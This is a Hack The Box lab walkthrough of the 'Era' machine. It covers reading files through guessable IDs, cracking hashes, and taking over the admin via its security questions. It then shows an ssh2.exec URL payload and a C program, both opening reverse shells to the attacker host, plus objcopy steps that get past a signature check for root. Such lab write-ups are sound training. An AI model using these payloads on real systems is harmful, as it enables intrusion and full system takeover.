---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Era Machine Walk-through

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the Era machine on Hack The Box. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### About Machine <a href="#e79a" id="e79a"></a>

`Era` is a medium difficulty Linux machine that features an insecure `PHP` web application alongside a weakly protected system service. First, web enumeration reveals insecure file handling and authentication logic, which can be leveraged to obtain an administrator session. Further inspection of the application's source code reveals a vulnerable file-preview mechanism that enables remote code execution through `PHP` stream wrappers. Finally, upon gaining remote access, a root-executed scheduled task reveals a monitoring binary with an easily bypassed `ELF` signature check that can be overwritten to achieve full system compromise.

### Machine Info <a href="#b728" id="b728"></a>

* **Machine Name:** Era
* **Machine OS:** Linux
* **Difficulty:** Medium
* Machine Link: \[[https://app.hackthebox.com/machines/Era](https://app.hackthebox.com/machines/Era)]

### Initial Scanning: <a href="#a9e5" id="a9e5"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.10.11.79 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.5
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=8/20%OT=21%CT=1%CU=36915%PV=Y%DS=2%DC=T%G=Y%TM=68A5A07
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST1
OS:1NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 17.672 days (since Sat Aug  2 23:38:49 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   66.95 ms 10.10.14.1
2   67.01 ms 10.10.11.79
```

Add the `era.htb` to our `/etc/hosts` file.

```bash
sudo echo "10.10.11.79 era.htb" | sudo tee -a /etc/hosts
```

After opening the website we can see that it is a interior design websites or online interior design platform. Now we can try to enumerate the website.\
First we can perform Directory Listing. But There seems to be nothing in the directory scan. Now we can try to Subdomain enumeration.

```bash
ffuf -u http://era.htb/ -H 'HOST: FUZZ.era.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 4
```

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Z6r4Uf9Xz-m788roS200lA.png" alt="" height="289" width="700"><figcaption></figcaption></figure>

We can found a subdoimain called `file`. Now enter the subdomain `file.era.htb` in /etc/hosts file.

Add the `file.era.htb` to our `/etc/hosts` file.

```bash
sudo echo "10.10.11.79 era.htb file.era.htb" | sudo tee -a /etc/hosts
```

<figure><img src="https://miro.medium.com/v2/resize:fit:491/1*3mMtcAkIGNPpZ0xw-rNLFQ.png" alt="" height="202" width="491"><figcaption></figcaption></figure>

After adding the `file.era.htb` in /etc/hosts file and browsing `http://file.era.htb` we can see the Era Storage website. Now here we can try to perform directory listing.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Se0OV-LXGVCE_i1dqLF7Mg.png" alt="" height="328" width="700"><figcaption></figcaption></figure>

```bash
dirsearch -u http://file.era.htb/ -e php,html,txt -t 100 --random-agent --include-status=200,301,302 --timeout=5
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*mt5T5QhLvBn56mayfaaOTw.png" alt="" height="247" width="700"><figcaption></figcaption></figure>

And we can see `/register.php` can be used to register the account.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*bQayiGat04DLuho7dapuBA.png" alt="" height="296" width="700"><figcaption></figcaption></figure>

After register and login Storage management page will be open. Notice in this page we see the Upload files option. Open the Upload file option and we try to upload malicious php file and we successfully upload the malicious .php file. but, there the result is a download route with id. That means the website give ous a ID to download file. So, lets try to download any other files by manipulation file ID.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*kNq58wPVOW47rdWqYTGuNQ.png" alt="" height="328" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*BuMDtqKiNHZGIAB5mW7vcg.png" alt="" height="323" width="700"><figcaption></figcaption></figure>

To FUZZ ID we need two things

1. A cookie value to request

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XvtSZ_t0329Jw_FZ1dAN6w.png" alt="" height="270" width="700"><figcaption></figcaption></figure>

2\. A ID Dictionary.

So, At first we create a dictionary:

```bash
seq 1 5000 > id.txt                     
```

And we use our cookie value to FUZZ ID.

```bash
ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -w id.txt -H 'Cookie: PHPSESSID=4vh3cfrsh5upnefpgq4tdvvm1o' -fw 3161
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*rs_INjllw_y9pcYjJN_O2g.png" alt="" height="332" width="700"><figcaption></figcaption></figure>

And we found two other response or ID. Now lets try to download file by using those ID.

We can Browse `http://file.era.htb/download.php?id=54` and we may be site backup archive file.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*UPm0ic9dLH1T_eSzDuukgw.png" alt="" height="307" width="700"><figcaption></figcaption></figure>

After download and extracting the file we found a interesting file called `filedb.sqlite`. Lets analysis the file.

<figure><img src="https://miro.medium.com/v2/resize:fit:616/1*jZP9-FeIGIzhWNLByg9aQQ.png" alt="" height="535" width="616"><figcaption></figcaption></figure>

We found users password hash.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Smj4odD2KdyClgrYRg_SlQ.png" alt="" height="315" width="700"><figcaption></figcaption></figure>

Now try to crack the passwords. First create a hash.txt file and store each username and their password. Then crack the hash by useing john:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*imDsdg5bgMy9pI92iFVG0Q.png" alt="" height="177" width="700"><figcaption></figcaption></figure>

And we found two username and password.

With these two users we tried to log in to `file.era.htb` to see if there was anything that could be used, and it didn’t seem to.\
View download.php source code from previously downloaded Sitebackup directory and we can found an interesting thing:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*gZsGETq6BINGMyNbNe3nnQ.png" alt="" height="443" width="700"><figcaption></figcaption></figure>

It is found that when the user ID is 1, that is, the admin user can perform special operations.

* Administrators can pass. `?show=true&format=php://filter/...` Access any local file content
* Risk of arbitrary file reading (LFI), in particular `php://filter` or `data://`
* If the user can control `format` and `id` Collaborate `wrapper . $file` In combination, there will be serious loopholes

Then we must find a way to log in to the admin, and notice that there is another file after the previous website backup: `security_login.php`

By analysis this file we found interesting portion this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*eOQTiChGcCHqLhAgR-FPJw.png" alt="" height="353" width="700"><figcaption></figcaption></figure>

We can try to login by using the security questions of admin user which we found from `filedb.sqlite` file, but we fail to login.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*R-zSY5PQAnbfn4oYtIUyKg.png" alt="" height="243" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*eDZ4joSdTXsFfvbjc3n3_g.png" alt="" height="322" width="700"><figcaption></figcaption></figure>

Now we try to update or change security questing from **Update Security Questin** Section.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*Dj_b9XdGQEFO4h5eCWhf_A.png" alt="" height="309" width="700"><figcaption></figcaption></figure>

After the change again to make `http://file.era.htb/security_login.php` login, successfully log in as admin, beacouse notice after verification when website redirect to `manage.php` page here we can see the `site-backup-30-08-24.zip` and `signing.zip` for download file which we can't see previously.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*DjVfInsY2UsoudZ6Wu2NUQ.png" alt="" height="317" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*5E14YUQBQZ-t-EB_AtfcLg.png" alt="" height="320" width="700"><figcaption></figcaption></figure>

Now we can go back to `download.php` to find the way to use.

Previously analyzed, there may be pseudo-protocol use, but after my attempt, the following URL will not be directly displayed.

```bash
http://file.era.htb/download.php?id=1&show=true&format=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*GJPrKaGXqGTbiTY1PQsmgQ.png" alt="" height="205" width="700"><figcaption></figcaption></figure>

After trying to find out, **yuri** user account can log in to the FTP service and we can found two directory called `apache2_conf` and `php8.1_conf`.

<figure><img src="https://miro.medium.com/v2/resize:fit:685/1*siBRWoDBA0zx4gjdbDtKQw.png" alt="" height="315" width="685"><figcaption></figcaption></figure>

Note that there is an extension of ssh2 inside the php8.1\_conf directory, using reference [PHP manual: PHP: Supported protocols and encapsulation protocols — Manual](https://www.php.net/manual/en/wrappers.php)

* ssh2.shell://user:[pass@example.com](mailto:pass@example.com):22/xterm
* ssh2.exec://user:[pass@example.com](mailto:pass@example.com):22/usr/local/bin/somecmd
* ssh2.tunnel://user:[pass@example.com](mailto:pass@example.com):22/192.168.0.1:14
* ssh2.sftp://user:[pass@example.com](mailto:pass@example.com):22/path/to/filename

Try the following payload to rebound the shell, because it is the base64 encoding after the incoming URL, so try to avoid the existence of the plus sign (which will be resolved to space), the solution is to insert the elimination code plus number before the base64 encoding.

Our payload is:

1. Our original reverse shell payload:

```bash
(bash >& /dev/tcp/10.10.14.95/9229  0>&1) &
```

2. Convert this payload to Base64, and add `bash -c 'printf`, Result:

```bash
bash -c 'printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTUvOTIyOSAgMD4mMSkgJg==
```

3. Now convert this into URL Encoding:

```bash
bash%20-c%20'printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTUvOTIyOSAgMD4mMSkgJg==
```

4. Final Payload:

```bash
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTQuOTUvOTIyOSAgMD4mMSkgJg==|base64%20-d|bash%27;
```

Before Browseing this payload fist start our listener Netcat :

```bash
rlwrap -cAr nc -lnvp 9229
```

And then Browse the payload and boom we got reverse shell of eric user and also get user flag.🎉

<figure><img src="https://miro.medium.com/v2/resize:fit:680/1*89J32qnwLR0GVDV-W5IWYw.png" alt="" height="409" width="680"><figcaption></figcaption></figure>

Now for PrivEsc Upload `LinPEAS.sh` and we can discover that the current user has a special file called monitor. Location of the file is: `/opt/AV/periodic-checks/monitor`

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*CuUzx0Z7TbwuKZeHsTydbQ.png" alt="" height="95" width="700"><figcaption></figcaption></figure>

Now check the file permission `ls -la /opt/AV/periodic-checks/monitor`

Notice the monitor and eric have same group `devs`.

<figure><img src="https://miro.medium.com/v2/resize:fit:660/1*w9Ey6SGYpknDyR2M-V_8NA.png" alt="" height="214" width="660"><figcaption></figcaption></figure>

Now try to see running processes for any interesting information by using pspy. Upload and run papy we will notice in machine

* `CRON -f -P` – This is the cron daemon running in the foreground, meaning a scheduled task has been triggered.
* `bash -c echo > /opt/AV/periodic-checks/status.log` – The scheduled task clears the contents of the status.log file.
* `objcopy --dump-section .text_sig=... /opt/AV/periodic-checks/monitor` – Extracts the .text\_sig section from the /opt/AV/periodic-checks/monitor binary, probably for integrity verification or signature checking.
* `/root/initiate_monitoring.sh` executed multiple times (PID 25204–25213) – This is the key point: the cron job triggers `/root/initiate_monitoring.sh`, but it runs many times in quick succession.

Therefore, it can be analyzed to conclude that the file will be executed at a time, and the text\_sig segment in it will be checked whether it will change, so all we can do is modify the file content for the claim and copy the text\_sig segment.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8fPbBrd1wxeMWjc1-aJzLA.png" alt="" height="297" width="700"><figcaption></figcaption></figure>

Now we can create a file called exploit.c containing in our local machine:

<figure><img src="https://miro.medium.com/v2/resize:fit:604/1*oDriZAROWaLzxnuPUk2ADg.png" alt="" height="141" width="604"><figcaption></figcaption></figure>

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.95/4242 0>&1'");
    return 0;
}
```

And then upload this file in remote machine's `/opt/AV/periodic-checks/` directory.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*OmMH2CDodLLo0wLbISiJog.png" alt="" height="342" width="700"><figcaption></figcaption></figure>

And then run the following command to exploit:

```bash
gcc exploit.c -o exploit
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
objcopy --add-section .text_sig=text_sig exploit
```

Then start listener in another terminal

```bash
rlwrap -cAr nc -lnvp 4242
```

And then run the following command in remote machine:

```bash
cp exploit monitor
```

And wait for few second and Boom we get Root shell and Root flag.💥

<figure><img src="https://miro.medium.com/v2/resize:fit:489/1*Iapc9W-yIELXqA1BIwel-w.png" alt="" height="99" width="489"><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

### Follow me on below Social Media: <a href="#id-1106" id="id-1106"></a>

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
